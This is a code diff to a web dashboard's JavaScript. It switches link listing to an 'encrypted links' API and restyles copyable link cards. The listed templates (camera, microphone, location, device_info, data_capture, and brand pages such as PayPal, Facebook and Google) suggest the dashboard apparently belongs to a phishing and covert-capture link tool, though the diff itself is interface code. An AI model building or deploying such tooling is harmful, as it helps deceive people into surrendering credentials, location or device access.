@@ -125,32 +125,74 @@ function check_new_version(){
 
 
 $(document).ready(function(){
-    $.post("list_templates.php",function(data){
-        
-        var get_json = JSON.parse(data)
-        for(let i = 0; i < get_json.length;){
+    // Fetch encrypted links from new API
+    $.get("generate_links.php", function(response){
+        if (response.success) {
+            var templates = response.templates;
             
-            // Check if panel-v4 is being used (has .link-card support)
-            if ($('.dashboard-card').length > 0) {
-                // Modern V4 card style
-                $("#links").append('<div class="link-card">' +
-                    '<div class="link-text">'+"http://"+location.host+"/templates/"+get_json[i]+"/index.html"+'</div>' +
-                    '<button class="btn btn-primary-modern btn-modern cp-btn" data-link="'+"http://"+location.host+"/templates/"+get_json[i]+"/index.html"+'" style="margin: 0;">' +
-                    '<i class="fas fa-copy"></i> Copy</button>' +
-                    '</div>')
-            } else {
-                // Original V3 style
-                $("#links").append('<div class="mt-2 d-flex justify-content-center" ><p id="path" class="form-control m-1 w-50 ptext">'+"http://"+location.host+"/templates/"+get_json[i]+"/index.html"+'</p><span class="input-group-btn m-1 cp-btn"><button class="btn btn-default" type="button" id="copy-button" data-toggle="tooltip" data-placement="button" title="Copy to Clipboard">Copy </button></span></div>')
+            // Template icon and color mapping
+            var templateStyles = {
+                'advanced_location': { color: '#e74c3c', bg: 'linear-gradient(135deg, #e74c3c 0%, #c0392b 100%)' },
+                'camera': { color: '#3498db', bg: 'linear-gradient(135deg, #3498db 0%, #2980b9 100%)' },
+                'device_info': { color: '#9b59b6', bg: 'linear-gradient(135deg, #9b59b6 0%, #8e44ad 100%)' },
+                'discord': { color: '#5865f2', bg: 'linear-gradient(135deg, #5865f2 0%, #4752c4 100%)' },
+                'facebook': { color: '#1877f2', bg: 'linear-gradient(135deg, #1877f2 0%, #166fe5 100%)' },
+                'google': { color: '#ea4335', bg: 'linear-gradient(135deg, #ea4335 0%, #d23321 100%)' },
+                'microphone': { color: '#e67e22', bg: 'linear-gradient(135deg, #e67e22 0%, #d35400 100%)' },
+                'microsoft': { color: '#00a4ef', bg: 'linear-gradient(135deg, #00a4ef 0%, #0078d4 100%)' },
+                'location': { color: '#27ae60', bg: 'linear-gradient(135deg, #27ae60 0%, #229954 100%)' },
+                'netflix': { color: '#e50914', bg: 'linear-gradient(135deg, #e50914 0%, #b20710 100%)' },
+                'data_capture': { color: '#34495e', bg: 'linear-gradient(135deg, #34495e 0%, #2c3e50 100%)' },
+                'paypal': { color: '#0070ba', bg: 'linear-gradient(135deg, #0070ba 0%, #005ea6 100%)' },
+                'spotify': { color: '#1db954', bg: 'linear-gradient(135deg, #1db954 0%, #1ed760 100%)' },
+                'steam': { color: '#171a21', bg: 'linear-gradient(135deg, #171a21 0%, #1b2838 100%)' },
+                'twitter': { color: '#1d9bf0', bg: 'linear-gradient(135deg, #1d9bf0 0%, #0c8bd9 100%)' },
+                'weather': { color: '#f39c12', bg: 'linear-gradient(135deg, #f39c12 0%, #e67e22 100%)' }
+            };
+            
+            for(let key in templates) {
+                var template = templates[key];
+                var style = templateStyles[key] || { color: '#667eea', bg: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)' };
+                
+                // Check if panel-v4/v5 is being used (has .link-card support)
+                if ($('.dashboard-card').length > 0) {
+                    // Modern V4/V5 card style with icons
+                    $("#links").append(
+                        '<div class="link-card" style="border-left: 4px solid ' + style.color + ';">' +
+                            '<div style="display: flex; align-items: center; gap: 15px; flex: 1;">' +
+                                '<div style="width: 50px; height: 50px; background: ' + style.bg + '; border-radius: 10px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.5rem;">' +
+                                    '<i class="fas ' + template.icon + '"></i>' +
+                                '</div>' +
+                                '<div style="flex: 1;">' +
+                                    '<h5 style="margin: 0 0 5px 0; color: ' + style.color + ';">' + template.name + '</h5>' +
+                                    '<p style="margin: 0; font-size: 0.85rem; color: #666;">' + template.desc + '</p>' +
+                                    '<code style="font-size: 0.75rem; color: #999; word-break: break-all;">' + template.url + '</code>' +
+                                '</div>' +
+                            '</div>' +
+                            '<button class="btn btn-primary-modern btn-modern cp-btn" data-link="' + template.url + '" style="margin: 0;">' +
+                                '<i class="fas fa-copy"></i> Copy' +
+                            '</button>' +
+                        '</div>'
+                    );
+                } else {
+                    // Original V3 style with encryption
+                    $("#links").append(
+                        '<div class="mt-2 d-flex justify-content-center" >' +
+                            '<p id="path" class="form-control m-1 w-50 ptext">' + template.url + '</p>' +
+                            '<span class="input-group-btn m-1 cp-btn">' +
+                                '<button class="btn btn-default" type="button" id="copy-button" data-toggle="tooltip" data-placement="button" title="Copy to Clipboard">Copy</button>' +
+                            '</span>' +
+                        '</div>'
+                    );
+                }
             }
-            i++
-        
+            
+            // Update stats after links are loaded (for V4/V5)
+            if (typeof updateStats === 'function') {
+                updateStats();
+            }
         }
-        
-        // Update stats after links are loaded (for V4)
-        if (typeof updateStats === 'function') {
-            updateStats()
-        }
-    })
+    });
 
     setTimeout(function(){
 
@@ -159,8 +201,9 @@ $(document).ready(function(){
             navigator.clipboard.writeText(node);
             Swal.fire({
                 icon: 'success',
-                title: 'The link was copied!',
-                text: node
+                title: 'Link Copied!',
+                html: '<p style="font-size: 0.9rem; word-break: break-all;">' + node + '</p>',
+                showConfirmButton: true
                 })
             
             })
